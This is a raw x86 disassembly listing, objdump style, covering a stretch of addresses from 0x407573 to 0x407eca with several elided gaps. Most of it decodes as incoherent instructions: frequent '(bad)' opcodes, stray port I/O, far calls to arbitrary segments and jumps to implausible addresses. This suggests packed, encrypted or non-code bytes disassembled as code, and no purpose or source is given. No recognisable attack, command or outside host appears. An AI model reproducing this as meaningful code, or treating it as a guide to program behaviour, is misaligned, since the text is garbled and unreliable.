  407573:	mov    dl,BYTE PTR [eax-0x673d36fe]
  407579:	add    dl,BYTE PTR [ebp-0x75]
  40757c:	push   esp
  40757d:	add    esp,0xfffffffc
  407580:	stos   BYTE PTR es:[edi],al
  407581:	add    ch,BYTE PTR [edx+0xd]
  407584:	daa    
  407585:	xor    DWORD PTR [edi],eax
  407587:	call   0xffd0fac5
  40758c:	jbe    0x40756d
  40758e:	sar    bl,0xe1
  407591:	in     al,dx
  407592:	or     eax,0xd0563941
  407597:	pop    es
  407598:	push   ecx
  407599:	retf   
  40759a:	push   edi
  40759b:	call   DWORD PTR [esi+0x65]
  40759e:	sar    bl,1
  4075a0:	dec    esi
  4075a1:	mov    bl,0xb
  4075a3:	call   0xff96e15e
	...
  4075bc:	jo     0x407568
  4075be:	(bad)  
  4075bf:	dec    DWORD PTR [ebp-0xa7e991e]
  4075c5:	mov    ecx,DWORD PTR [esi-0x1]
  4075c8:	es in  eax,0xbf
  4075cb:	sti    
  4075cc:	mov    DWORD PTR [esi+0x4d160bd0],ecx
  4075d2:	shr    BYTE PTR [eax],1
  4075d4:	js     0x40763d
  4075d6:	imul   edx,DWORD PTR [edx-0x4d],0x67
  4075da:	add    ecx,DWORD PTR [ebx]
  4075dc:	stc    
  4075dd:	pop    esi
  4075de:	sbb    BYTE PTR [edi+0x3b],0x67
  4075e2:	add    eax,edi
  4075e4:	je     0x407665
  4075e6:	add    eax,DWORD PTR [eax]
  4075e8:	cmp    DWORD PTR [edi+0x3e],esp
  4075eb:	inc    ebp
  4075ec:	in     eax,0xce
  4075ee:	std    
  4075ef:	call   esi
  4075f1:	add    DWORD PTR [edx+ebp*2],eax
  4075f4:	cmp    DWORD PTR [ecx],esi
  4075f6:	add    ebp,DWORD PTR [edx+0x39]
  4075f9:	in     al,0xbf
  4075fb:	repz imul ebx,esp,0xc6aef47f
  407602:	push   ebp
  407603:	push   eax
  407604:	scas   al,BYTE PTR es:[edi]
  407605:	xchg   esp,eax
  407606:	pop    ebx
  407607:	jmp    FWORD PTR [ebx+edx*1]
  40760a:	imul   esp,DWORD PTR [ebx+esi*4],0x67
  40760e:	add    ecx,DWORD PTR [ebx]
  407610:	jns    0x40759d
  407612:	add    cl,ch
  407614:	pop    ebx
  407615:	add    bl,ch
  407617:	add    edi,DWORD PTR [ecx]
  407619:	call   0x38a124
  40761e:	adc    eax,0xd0
	...
  407633:	add    BYTE PTR [edx+0x68],al
  407636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407637:	call   0x7bb4:0x3372556e
  40763e:	cmc    
  40763f:	dec    ebp
  407640:	pop    esi
  407641:	push   ebp
  407642:	cdq    
  407643:	mov    cl,0x5e
  407645:	test   BYTE PTR [edx],dh
  407647:	push   esi
  407648:	dec    esi
  407649:	xchg   DWORD PTR [esp+edx*2+0x4e],ebp
  40764d:	push   ebp
  40764e:	fiadd  WORD PTR [edi+0x55de44b4]
  407654:	ss mov al,0x40
  407657:	mov    al,ds:0x54e8bf66
  40765c:	in     al,dx
  40765d:	dec    edi
  40765e:	mov    dh,0x55
  407660:	push   ds
  407661:	push   ebp
  407662:	cld    
  407663:	into   
  407664:	popa   
  407665:	mov    edi,0x99bf6be8
  40766a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40766b:	push   ebp
  40766c:	mov    al,0x7a
  40766e:	test   DWORD PTR [ebp-0x2],ecx
  407671:	push   esp
  407672:	add    eax,DWORD PTR [ecx+eiz*2]
  407675:	call   0x543c:0x55eec2d6
  40767c:	out    dx,al
  40767d:	push   esp
  40767e:	jle    0x4076d5
  407680:	and    al,0xcb
  407682:	mov    edi,0xf95cd6c2
  407687:	cdq    
  407688:	into   
  407689:	push   esp
  40768a:	jo     0x40770b
  40768c:	aad    0x4c
  40768e:	pop    esi
  40768f:	push   ebp
  407690:	push   ebx
  407691:	add    cl,al
  407693:	xchg   esp,eax
  407694:	outs   dx,BYTE PTR ds:[esi]
  407695:	mov    edi,0x54e8
	...
  4076aa:	add    BYTE PTR [eax],al
  4076ac:	in     al,0x4f
  4076ae:	ds push ebp
  4076b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b1:	push   esp
  4076b2:	hlt    
  4076b3:	into   
  4076b4:	push   ecx
  4076b5:	mov    edi,0xb222e8ff
  4076ba:	mov    ecx,0x8586e42e
  4076bf:	adc    esp,esi
  4076c1:	push   esp
  4076c2:	call   DWORD PTR [ebx-0x213617c6]
  4076c8:	jnp    0x40771e
  4076ca:	(bad)  
  4076cb:	push   esp
  4076cc:	add    eax,0xc06ff4d
  4076d1:	or     esi,DWORD PTR [ebp-0x30]
  4076d4:	jnp    0x40772a
  4076d6:	out    0xbd,eax
  4076d8:	mov    al,0x54
  4076da:	jmp    DWORD PTR [eax-0x32]
  4076dd:	pop    edi
  4076de:	mul    esi
  4076e0:	in     eax,dx
  4076e1:	add    BYTE PTR [ebp-0xab123f],0x39
  4076e8:	and    eax,0x3528373d
  4076ed:	push   ebx
  4076ee:	mov    ch,0xb9
  4076f0:	jne    0x407745
  4076f2:	(bad)  
  4076f3:	mov    esi,0x2828cd2f
  4076f8:	cmp    eax,0x65731168
  4076fd:	push   ebx
  4076fe:	or     ebp,DWORD PTR [ecx+0x5c82eef6]
  407704:	inc    edx
  407705:	dec    ebx
  407706:	call   DWORD PTR [esi-0x71f6330a]
  40770c:	dec    edx
  40770d:	add    DWORD PTR [ebp+0xa5],0x0
	...
  407724:	jne    0x407779
  407726:	call   DWORD PTR [edx-0x6a7ac4d0]
  40772c:	test   DWORD PTR [ebx-0x1],edx
  40772f:	aam    0x3a
  407731:	add    BYTE PTR [eax],al
  407733:	mov    ecx,0x5eb62e52
  407738:	test   DWORD PTR gs:[ebp-0xacfac7],eax
  40773f:	mov    ecx,0x37a4a2
  407744:	sar    edi,1
  407746:	(bad)  
  407747:	mov    ch,0x60
  407749:	(bad)  
  40774a:	(bad)  
  40774b:	dec    DWORD PTR [edi+0x2]
  40774e:	jne    0x407779
  407750:	loope  0x407751
  407752:	out    0xcd,eax
  407754:	sbb    DWORD PTR [esi+edi*8+0x1243500b],ebp
  40775b:	or     DWORD PTR ds:0x3ffff70f,0x53
  407762:	je     0x40776e
  407764:	aas    
  407765:	out    dx,eax
  407766:	mov    es,WORD PTR [ebp-0x13bbc]
  40776c:	cmp    ecx,DWORD PTR [ecx]
  40776e:	mov    DWORD PTR [ebp-0x13bdc],0xffffff50
  407778:	add    BYTE PTR [ebp+ecx*4-0x7d50f04a],dh
  40777f:	mov    ebp,0xfffeb6f4
  407784:	adc    BYTE PTR [ebx],ch
  407786:	add    DWORD PTR ds:[eax],0x0
	...
  40779a:	add    BYTE PTR [eax],al
  40779c:	popf   
  40779d:	sbb    bh,dh
  40779f:	dec    edi
  4077a1:	stc    
  4077a2:	je     0x4077da
  4077a4:	jp     0x4077a2
  4077a6:	mov    WORD PTR [ebp-0x14934],es
  4077ac:	inc    eax
  4077ad:	scas   eax,DWORD PTR es:[edi]
  4077ae:	mov    ah,0xe4
  4077b0:	xlat   BYTE PTR ds:[ebx]
  4077b1:	scas   al,BYTE PTR es:[edi]
  4077b2:	(bad)  
  4077b3:	call   0x3f9a5a
  4077b8:	jmp    0x407778
  4077ba:	jae    0x4077c5
  4077bc:	push   ebx
  4077bd:	jno    0x40778b
  4077bf:	test   DWORD PTR [edi-0x51],0xade574ff
  4077c6:	mov    ah,0xe4
  4077c8:	scas   eax,DWORD PTR es:[di]
  4077ca:	(bad)  
  4077cb:	call   0x3ff050
  4077d0:	cmp    DWORD PTR [edx],esp
  4077d2:	mov    esp,esp
  4077d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d5:	rcl    DWORD PTR [edx+0x0],0x39
  4077d9:	imul   eax,DWORD PTR [ebx],0x5abcdc83
  4077df:	call   DWORD PTR [esi-0x45952898]
  4077e5:	jecxz  0x407846
  4077e7:	test   DWORD PTR [esi+0x1b740419],0x6ee890e6
  4077f1:	jmp    0x90257848
  4077f6:	fild   DWORD PTR [ecx]
  4077f8:	cmp    edx,ebp
  4077fa:	xchg   ecx,eax
  4077fb:	jmp    esp
  4077fd:	push   eax
  4077fe:	pop    ebx
  4077ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  407814:	mov    ecx,DWORD PTR [ecx+0x52]
  407817:	inc    DWORD PTR [esp+edx*2+0x5946ff5a]
  40781e:	fadd   DWORD PTR [edi]
  407820:	push   ecx
  407821:	pop    ebp
  407822:	xchg   ebp,eax
  407823:	push   DWORD PTR [esi]
  407825:	sub    ebx,DWORD PTR [eax+0x524326e8]
  40782b:	jmp    FWORD PTR [edi+ecx*2-0x6d1412a5]
  407832:	push   edx
  407833:	dec    esp
  407835:	fwait
  407836:	pop    edx
  407837:	dec    DWORD PTR [esi]
  407839:	mov    ds:0x9b0ee498,eax
  40783e:	push   edx
  40783f:	inc    DWORD PTR [edi+ecx*2+0x6aabad5b]
  407846:	push   edx
  407847:	jmp    DWORD PTR [ebx+eiz*4+0x7ae6ff5a]
  40784e:	fadd   DWORD PTR [edi]
  407850:	shl    eax,1
  407852:	xchg   ebp,eax
  407853:	call   esi
  407855:	retf   0xe097
  407858:	(bad)  
  407859:	loop   0x4078ac
  40785b:	dec    DWORD PTR [eax+eax*1-0xf]
  40785f:	pop    ebx
  407860:	jl     0x4077f0
  407862:	pop    esi
  407863:	push   edx
  407864:	mov    dh,0x8b
  407866:	dec    ebp
  407867:	pop    edx
  407868:	scas   al,BYTE PTR es:[edi]
  407869:	push   ecx
  40786a:	inc    ecx
  40786b:	dec    edx
  40786c:	in     al,dx
  40786d:	push   ecx
  40786e:	inc    esi
  40786f:	push   edx
  407870:	in     al,0x64
  407872:	ss push edx
  407874:	xchg   esi,eax
  407875:	push   0x9875
	...
  40788a:	add    BYTE PTR [eax],al
  40788c:	mov    ss,WORD PTR [ecx+0x2e]
  40788f:	cwde   
  407890:	xchg   ecx,eax
  407891:	dec    ecx
  407892:	es push edx
  407894:	xchg   ecx,eax
  407895:	(bad)  
  407896:	push   esp
  407897:	push   edx
  407898:	jbe    0x4078eb
  40789a:	pop    esp
  40789b:	arpl   WORD PTR [esi+0x51],sp
  40789e:	push   cs
  40789f:	pop    ebx
  4078a0:	lahf   
  4078a1:	mov    eax,DWORD PTR [esi]
  4078a3:	push   edx
  4078a4:	pop    esi
  4078a5:	mov    edi,ecx
  4078a7:	pop    ecx
  4078a8:	push   esi
  4078a9:	push   ecx
  4078aa:	add    DWORD PTR [esi-0x7c],ebp
  4078ad:	push   ecx
  4078ae:	out    dx,al
  4078af:	push   ecx
  4078b0:	cld    
  4078b1:	push   edi
  4078b2:	rcl    BYTE PTR [esp+edi*1-0x53ae21af],1
  4078b9:	push   esp
  4078ba:	shl    DWORD PTR [edi-0x4a],0xff
  4078be:	call   0xe94873fd
  4078c3:	mov    dh,0xb3
  4078c5:	arpl   WORD PTR [edx+0x48],bp
  4078c8:	or     eax,0x3cdde8e6
  4078cd:	push   ecx
  4078ce:	xor    al,0xfc
  4078d0:	push   ds
  4078d1:	mov    ds:0x86fe515b,eax
  4078d6:	and    al,0x50
  4078d8:	popa   
  4078d9:	add    cl,ch
  4078db:	pusha  
  4078dc:	scas   eax,DWORD PTR es:[edi]
  4078dd:	out    0xc6,eax
  4078df:	sbb    BYTE PTR [eax+0x0],bh
  4078e2:	adc    DWORD PTR ds:0x50e8bf26,edx
  4078e8:	dec    esp
  4078e9:	or     BYTE PTR [eax],al
  4078eb:	and    esi,0x6eff36
	...
  407901:	add    BYTE PTR [eax],al
  407903:	add    BYTE PTR [esi-0x45],al
  407906:	idiv   DWORD PTR [ecx-0x57c92c1e]
  40790c:	cmp    ch,al
  40790e:	inc    eax
  40790f:	push   ds
  407910:	jp     0x407962
  407912:	(bad)  
  407913:	adc    al,0x8e
  407915:	daa    
  407916:	inc    ecx
  407917:	jmp    0x3ef82f1e
  40791c:	call   0x60fe3925
  407921:	xchg   DWORD PTR [ebp+0x35],eax
  407924:	gs (bad) 
  407926:	call   DWORD PTR ds:0xf17550ab
  40792c:	adc    cl,BYTE PTR [ecx+0x510816b1]
  407932:	jne    0x407945
  407934:	or     bl,cl
  407936:	repz push es
  407938:	xchg   al,bh
  40793a:	out    0x1e,eax
  40793c:	stos   BYTE PTR es:[edi],al
  40793d:	push   eax
  40793e:	push   esi
  407940:	addr16 dec esp
  407942:	call   0xff912918
  407947:	push   ecx
  407948:	mov    dh,0x8
  40794a:	inc    ecx
  40794b:	jmp    0xc1484ed9
  407950:	mov    BYTE PTR [edi+edi*8-0x32],cl
  407954:	mov    ebp,edx
  407956:	sti    
  407957:	mov    BYTE PTR [edi],0x8
  40795a:	call   0xff90289e
  40795f:	mov    al,ds:0x14000474
  407964:	test   BYTE PTR [ebx+eax*4-0x53],bl
	...
  40797c:	outs   dx,BYTE PTR ds:[esi]
  40797d:	(bad)  
  40797f:	adc    bh,BYTE PTR [eax]
  407981:	dec    edi
  407982:	jne    0x407965
  407984:	xchg   edx,eax
  407985:	and    dh,BYTE PTR [edx+0x4579898e]
  40798b:	add    BYTE PTR [ebx+ebp*1+0x71c7ffff],dh
  407992:	push   0xff428fd6
  407997:	addr16 mov dl,0xe8
  40799a:	inc    eax
  40799b:	add    BYTE PTR [edi+0x36],dl
  40799e:	pop    es
  40799f:	call   0x3f93ae
  4079a4:	pop    es
  4079a5:	ss sti 
  4079a7:	dec    DWORD PTR [ebp+0x2243e74b]
  4079ad:	mov    al,0xfe
  4079af:	leave  
  4079b0:	bound  eax,QWORD PTR [edi]
  4079b2:	add    BYTE PTR [ebp+0x1b],dl
  4079b5:	scas   eax,DWORD PTR es:[edi]
  4079b6:	add    ah,0x54
  4079b9:	sub    eax,0xb08069ff
  4079be:	je     0x4079c8
  4079c0:	dec    eax
  4079c1:	fdiv   DWORD PTR [eax+0x44ca47ff]
  4079c7:	cld    
  4079c8:	mov    eax,0xf6ef0003
  4079cd:	sub    ch,bl
  4079cf:	aaa    
  4079d0:	mov    eax,ds:0x8ff16803
  4079d5:	inc    edx
  4079d6:	(bad)  
  4079d7:	dec    ch
  4079d9:	dec    edx
  4079da:	out    0xaf,eax
  4079dc:	jns    0x40799d
  4079de:	(bad)  
  4079df:	push   0x0
	...
  4079f1:	add    BYTE PTR [eax],al
  4079f3:	add    BYTE PTR [eax],ah
  4079f5:	sub    ebp,DWORD PTR ds:0x68046138
  4079fb:	adc    al,0x48
  4079fd:	inc    ebp
  4079fe:	(bad)  
  4079ff:	(bad)  
  407a00:	sbb    eax,0x20412828
  407a05:	stos   DWORD PTR es:[edi],eax
  407a06:	xchg   ebp,eax
  407a07:	mov    bh,0xc7
  407a09:	mov    esi,0x184cc00a
  407a0e:	push   0xff44180a
  407a13:	dec    edi
  407a14:	enter  0xb761,0xff
  407a18:	cmp    DWORD PTR [esi-0x4c],esi
  407a1b:	cmp    DWORD PTR [bx+di+0x5e],ebx
  407a1f:	mov    esi,0x41177551
  407a24:	cmp    ecx,ebp
  407a26:	dec    esi
  407a27:	jne    0x407a6a
  407a29:	sbb    DWORD PTR [edx],0x5bddc6d9
  407a2f:	push   esi
  407a30:	test   ebp,esp
  407a32:	dec    esi
  407a33:	jmp    FWORD PTR [ebp*4-0x3ebe8ab2]
  407a3a:	cmp    al,0xb1
  407a3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a3d:	mov    ebp,0x5935c23c
  407a42:	mov    eax,0x47d9a58a
  407a47:	cld    
  407a48:	out    0x6d,eax
  407a4a:	fcos   
  407a4c:	adc    BYTE PTR [eax],ch
  407a4e:	dec    esi
  407a4f:	jne    0x407a82
  407a51:	icebp  
  407a52:	fidiv  DWORD PTR [eax+0x457ced76]
	...
  407a6c:	ins    DWORD PTR es:[edi],dx
  407a6d:	loope  0x407a87
  407a6f:	mov    ss,WORD PTR [ecx]
  407a71:	cwde   
  407a72:	add    ecx,DWORD PTR [ebx+0x411bab1c]
  407a78:	cmp    ecx,ebx
  407a7a:	push   cs
  407a7b:	add    ch,al
  407a7d:	mov    eax,ds:0x980139db
  407a82:	add    edx,DWORD PTR [edi+0x51]
  407a85:	push   0x52390085
  407a8a:	inc    ebx
  407a8b:	je     0x407ae1
  407a8d:	or     eax,0x3ee4d35c
  407a92:	dec    esi
  407a93:	push   0xffc4ff7a
  407a98:	xchg   BYTE PTR [edi],ch
  407a9a:	push   ecx
  407a9b:	mov    bh,0xe
  407a9d:	xchg   edi,eax
  407a9e:	mov    bl,0x67
  407aa0:	cmp    DWORD PTR [edi+0x5e],edx
  407aa3:	mov    esi,0xd8a60069
  407aa8:	ds pop eax
  407aaa:	ret    
  407aab:	cmp    dh,ch
  407aad:	dec    ebp
  407aae:	sbb    DWORD PTR [edx-0x56],0x385a8e4d
  407ab5:	(bad)  
  407ab6:	push   0x82d3390d
  407abb:	(bad)
  407abe:	test   eax,0x6e4dc68c
  407ac3:	dec    esi
  407ac4:	retf   
  407ac5:	sahf   
  407ac6:	and    DWORD PTR [edi],eax
  407ac8:	sub    al,0x93
  407aca:	pop    esi
  407acb:	fdiv   DWORD PTR [edx+0xfbdc4d]
	...
  407ae1:	add    BYTE PTR [eax],al
  407ae3:	add    BYTE PTR [esi-0x61b1683b],bl
  407ae9:	lods   eax,DWORD PTR ds:[esi]
  407aea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aeb:	cmp    al,0x7b
  407aed:	add    al,0xe9
  407aef:	mov    eax,0x476a5cc3
  407af4:	test   edx,ebx
  407af6:	call   0x9c8da3d4
  407afb:	sti    
  407afc:	pop    esi
  407afd:	push   edi
  407afe:	pop    ecx
  407aff:	dec    esi
  407b00:	outs   dx,BYTE PTR ds:[esi]
  407b01:	ja     0x407aaf
  407b03:	dec    edi
  407b04:	sar    edi,1
  407b06:	call   0x9e191a69
  407b0b:	or     edi,eax
  407b0d:	call   DWORD PTR [eax-0x1740f943]
  407b13:	dec    esi
  407b14:	int3   
  407b15:	test   DWORD PTR [eax],0xe64d6194
  407b1b:	dec    ebp
  407b1c:	lods   al,BYTE PTR ds:[esi]
  407b1d:	dec    esp
  407b1e:	(bad)  
  407b20:	ss pop eax
  407b22:	jecxz  0x407ab6
  407b24:	es dec ebp
  407b26:	mov    al,ds:0x1c003542
  407b2b:	jns    0x407b52
  407b2d:	jg     0x407ad4
  407b2f:	xor    BYTE PTR [esi],al
  407b31:	dec    ebp
  407b32:	add    BYTE PTR [esi+0x19fbc386],dh
  407b38:	ins    BYTE PTR es:[edi],dx
  407b39:	ror    DWORD PTR [ebx],cl
  407b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b3c:	dec    esi
  407b3d:	shr    DWORD PTR [eax],cl
  407b3f:	sub    BYTE PTR ds:0x3d6ccd58,dh
  407b45:	add    BYTE PTR [ebx],cl
  407b47:	test   eax,0x0
	...
  407b5c:	fadd   QWORD PTR [ebx+0x3ae8a1]
  407b62:	(bad)  
  407b63:	and    al,0x7d
  407b65:	add    BYTE PTR [eax],al
  407b67:	jmp    0x7585c0a6
  407b6c:	ins    BYTE PTR es:[edi],dx
  407b6d:	add    eax,0x4c90e900
  407b72:	imul   ebp,ecx,0xe9694c90
  407b78:	daa    
  407b79:	ret    
  407b7a:	repz mov ecx,0x3ef4831f
  407b80:	add    al,0x4d
  407b82:	push   eax
  407b83:	ds push sp
  407b86:	(bad)  
  407b87:	mov    esp,0x649f57f6
  407b8c:	xor    eax,0x91290b00
  407b91:	add    ebp,ecx
  407b93:	test   DWORD PTR [ebx],edi
  407b95:	add    BYTE PTR [eax],al
  407b97:	sbb    esp,0xede94117
  407b9d:	ror    BYTE PTR [ebx],cl
  407b9f:	adc    ebx,edi
  407ba1:	xchg   ebp,eax
  407ba2:	(bad)  
  407ba3:	dec    BYTE PTR [edx-0x419b2f87]
  407ba9:	push   ebx
  407baa:	imul   esi
  407bac:	in     eax,dx
  407bad:	scas   eax,DWORD PTR es:[edi]
  407bae:	push   ecx
  407baf:	ror    eax,1
  407bb1:	xchg   edx,eax
  407bb2:	(bad)  
  407bb3:	fidiv  WORD PTR [ebx+0x75def085]
  407bb9:	dec    ebx
  407bba:	call   0xff8c45a0
	...
  407bd3:	add    BYTE PTR [edx+0x4],ch
  407bd6:	push   0xff3f3874
  407bdb:	inc    BYTE PTR [ebp-0x30000951]
  407be1:	mov    esp,0x3f097534
  407be6:	jmp    edi
  407be8:	call   0x5a407b62
  407bed:	and    ah,0xf7
  407bf0:	scas   eax,DWORD PTR es:[edi]
  407bf1:	mov    esp,0x58280069
  407bf6:	aaa    
  407bf7:	inc    ecx
  407bf8:	loopne 0x407bb6
  407bfa:	mov    ah,0xf0
  407bfc:	inc    edi
  407bfd:	mov    esp,0x3285fffe
  407c02:	sub    BYTE PTR [ecx-0x60],al
  407c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c06:	jmp    0x88fc8bc0
  407c0b:	test   esp,edi
  407c0d:	mov    bl,0xfe
  407c0f:	(bad)  
  407c10:	jp     0x407c11
  407c12:	imul   edi,DWORD PTR [bx+si],0x3f
  407c16:	(bad)  
  407c17:	inc    BYTE PTR ds:0x4ffff6af
  407c1d:	mov    esp,0x3f397534
  407c22:	jmp    edi
  407c24:	sub    al,0x72
  407c26:	(bad)  
  407c27:	(bad)  
  407c28:	jmp    0x503864ae
  407c2d:	mov    esp,0xb40c858c
  407c32:	(bad)  
  407c33:	push   DWORD PTR [eax+0x387c27]
	...
  407c49:	add    BYTE PTR [eax],al
  407c4b:	add    BYTE PTR [ecx+0x40b5feff],ah
  407c51:	scas   eax,DWORD PTR es:[edi]
  407c52:	(bad)  
  407c53:	dec    DWORD PTR [edi-0xb]
  407c56:	je     0x407c81
  407c58:	popa   
  407c59:	add    al,0xe8
  407c5b:	test   eax,0xbfeb6c5
  407c60:	cmp    DWORD PTR [ecx+0x7bba18d0],ebx
  407c66:	sub    bh,dh
  407c68:	push   ss
  407c69:	inc    edx
  407c6a:	add    BYTE PTR [ebp+0x29],dh
  407c6d:	mov    dl,BYTE PTR [edi+ecx*4]
  407c70:	mov    esp,0xfeff5338
  407c75:	call   0xa1ebf2d5
  407c7a:	dec    ebx
  407c7b:	jmp    0x407cc2
  407c7d:	dec    esi
  407c7e:	inc    ebx
  407c7f:	je     0x407cc0
  407c81:	or     DWORD PTR [edx+ebp*2-0x55],ebx
  407c85:	jns    0x407cd2
  407c87:	(bad)  
  407c88:	mov    esp,0xceff5378
  407c8d:	xor    eax,DWORD PTR [ebx]
  407c8f:	add    BYTE PTR [ecx],bh
  407c91:	(bad)  
  407c92:	mov    ah,ah
  407c94:	(bad)  
  407c95:	(bad)  [edx+0x0]
  407c98:	sub    eax,0x9dbd868a
  407c9d:	mov    cl,0x4a
  407c9f:	(bad)  
  407ca0:	cmp    DWORD PTR ds:0xc0dc82b9,ebp
  407ca6:	push   edx
  407ca7:	call   DWORD PTR [esi+0x2144cf58]
  407cad:	pop    ecx
  407cae:	add    ebp,edi
	...
  407cc4:	(bad)  
  407cc5:	adc    ecx,edx
  407cc7:	pop    es
  407cc8:	xchg   ecx,eax
  407cc9:	pop    ss
  407cca:	call   0x66ec:0x912176ff
  407cd1:	jmp    0x612d7c20
  407cd6:	pop    ebx
  407cd7:	adc    eax,0xff4af98e
  407cdc:	mov    eax,?
  407cde:	push   edx
  407cdf:	dec    DWORD PTR [esi+0x49]
  407ce2:	rol    BYTE PTR [edi],1
  407ce4:	push   ecx
  407ce5:	pop    ecx
  407ce6:	call   0x2ee4:0x90593eff
  407ced:	add    esi,esp
  407cef:	dec    edx
  407cf0:	cs aam 0xf0
  407cf3:	pop    ebx
  407cf4:	and    BYTE PTR [ebx-0x6be1b52a],bl
  407cfa:	leave  
  407cfb:	push   edx
  407cfc:	push   ss
  407cfd:	dec    edx
  407cfe:	(bad)  
  407cff:	shl    BYTE PTR [esi],1
  407d01:	pop    eax
  407d02:	jo     0x407c9d
  407d04:	push   es
  407d05:	dec    edx
  407d06:	mov    dh,0x90
  407d08:	adc    eax,0xe14aae52
  407d0d:	push   ebx
  407d0e:	pop    eax
  407d0f:	dec    edx
  407d10:	out    dx,al
  407d11:	dec    ecx
  407d12:	push   esp
  407d13:	push   edi
  407d14:	out    dx,al
  407d15:	dec    ecx
  407d16:	xchg   esi,eax
  407d17:	pop    ebx
  407d18:	ror    DWORD PTR [edi-0x6c29b572],cl
  407d1e:	xchg   ecx,eax
  407d1f:	push   edx
  407d20:	into   
  407d21:	dec    ecx
  407d22:	xchg   ecx,eax
  407d23:	sub    cl,BYTE PTR [eax+0x4a7649]
	...
  407d39:	add    BYTE PTR [eax],al
  407d3b:	add    BYTE PTR [eax+edx*2+0x58b64a76],al
  407d42:	cmp    eax,0x5e49ae94
  407d47:	shr    BYTE PTR [esi-0x61b638a9],0x49
  407d4e:	dec    esi
  407d4f:	rcl    BYTE PTR [edx+0x397fe758],1
  407d55:	add    BYTE PTR [eax],dh
  407d57:	inc    ebp
  407d58:	xor    DWORD PTR [eax],eax
  407d5a:	pushf  
  407d5b:	jle    0x407cea
  407d5d:	jge    0x407d84
  407d5f:	inc    edi
  407d60:	jecxz  0x407d61
  407d62:	xchg   edx,eax
  407d63:	imul   BYTE PTR [edi-0x2d]
  407d66:	lock pop ebx
  407d68:	pop    edi
  407d69:	call   0xdb0c:0xc3b04a16
  407d70:	mov    ebp,0x4e03a808
  407d75:	shl    eax,cl
  407d77:	pop    ebx
  407d78:	das    
  407d79:	dec    edx
  407d7a:	add    dh,dh
  407d7c:	lock dec eax
  407d7e:	jne    0x407d6d
  407d80:	adc    bl,0x7
  407d83:	shr    DWORD PTR [edx],1
  407d85:	call   0xe904:0x3e62deff
  407d8c:	iret   
  407d8d:	jne    0x407d7b
  407d8f:	push   0x79
  407d91:	dec    esp
  407d92:	push   0xffffffe9
  407d94:	in     al,dx
  407d95:	in     al,dx
  407d96:	(bad)  
  407d97:	xor    al,0x5
  407d99:	popa   
  407d9a:	mov    ch,0x87
  407d9c:	jo     0x407de7
  407d9e:	mov    DWORD PTR [eax+eax*1],esp
	...
  407db1:	add    BYTE PTR [eax],al
  407db3:	add    BYTE PTR [ecx-0x6e170028],al
  407db9:	mov    ch,BYTE PTR [eax+0x4e]
  407dbc:	xor    eax,0xbe00ffbf
  407dc1:	pop    es
  407dc2:	inc    ecx
  407dc3:	jmp    0x91485149
  407dc8:	div    BYTE PTR [edx]
  407dca:	(bad)  
  407dcb:	jle    0x407e3d
  407dcd:	sar    ebx,cl
  407dcf:	jbe    0x407dbf
  407dd1:	add    al,ch
  407dd3:	xchg   edi,eax
  407dd4:	ror    DWORD PTR [eax-0x1],cl
  407dd7:	xor    bh,dh
  407dd9:	add    eax,DWORD PTR [eax]
  407ddb:	mov    ah,0x25
  407ddd:	pop    esp
  407dde:	sub    DWORD PTR ds:0x4eff514d,0x99fbc30e
  407de8:	add    ebx,edx
  407dea:	or     edi,DWORD PTR [esi]
  407dec:	shr    DWORD PTR ss:[eax],cl
  407def:	test   al,0x3a
  407df1:	pop    eax
  407df2:	cdq    
  407df3:	push   0x3d
  407df5:	add    BYTE PTR [ebx],cl
  407df7:	sub    DWORD PTR [eax-0x7d],esi
  407dfa:	int    0xe8
  407dfc:	cmp    al,BYTE PTR [eax]
  407dfe:	(bad)  
  407dff:	lods   al,BYTE PTR ds:[esi]
  407e00:	repnz (bad) 
  407e02:	(bad)  
  407e03:	call   0x85bf42
  407e08:	dec    esp
  407e09:	mov    bh,0x6
  407e0b:	add    BYTE PTR [eax+0x2a],dl
  407e0e:	jmp    FWORD PTR [ecx+0x50]
  407e11:	sub    bh,bh
  407e13:	imul   esp,DWORD PTR [eax],0xf444cf
	...
  407e29:	add    BYTE PTR [eax],al
  407e2b:	add    BYTE PTR [eax-0x31],dh
  407e2e:	test   ah,dh
  407e30:	ud1    edi,esi
  407e33:	push   eax
  407e34:	pop    es
  407e35:	aaa    
  407e36:	idiv   edi
  407e38:	ins    DWORD PTR es:[edi],dx
  407e39:	mov    eax,0x3a36be7
  407e3e:	add    BYTE PTR [ebx],cl
  407e40:	shl    BYTE PTR [edi],1
  407e42:	add    al,0xe9
  407e44:	pusha  
  407e45:	add    al,BYTE PTR [eax]
  407e47:	add    BYTE PTR [eax-0x1e],bh
  407e4a:	daa    
  407e4b:	inc    ecx
  407e4c:	loopne 0x407e06
  407e4e:	je     0x407e5c
  407e50:	enter  0xb3c9,0xff
  407e54:	(bad)  
  407e55:	xchg   ebx,eax
  407e56:	mov    dl,al
  407e58:	jne    0x407e20
  407e5a:	repz div DWORD PTR [edi-0x57adb048]
  407e61:	cmp    DWORD PTR [ebx-0x7b35b801],esi
  407e67:	lock das 
  407e69:	mov    eax,0x736ce8fe
  407e6e:	(bad)  
  407e6f:	call   DWORD PTR ds:0x7f7d7c6
  407e75:	mov    eax,0xfb35684f
  407e7a:	inc    eax
  407e7b:	add    bh,dh
  407e7d:	jne    0x407e6f
  407e7f:	test   DWORD PTR [edi-0x48],0xeabd35fe
  407e86:	inc    eax
  407e87:	add    al,bh
  407e89:	pop    es
  407e8a:	mov    bl,0xff
  407e8c:	pop    ss
  407e8d:	retf   0xe484
	...
  407ea4:	dec    edi
  407ea5:	mov    eax,0x59396afe
  407eaa:	fstp   TBYTE PTR [edx-0xfc67ef]
  407eb0:	test   BYTE PTR [ecx+0x4f],cl
  407eb3:	inc    DWORD PTR [esi+0x46]
  407eb6:	or     eax,0x3981075
  407ebb:	call   0xff8888a8
  407ec0:	rcl    bl,0x57
  407ec3:	mul    DWORD PTR [esi]
  407ec5:	es (bad) 
  407ec8:	xchg   esi,eax
  407ec9:	xchg   ebp,eax
  407eca:	or     al,0x41
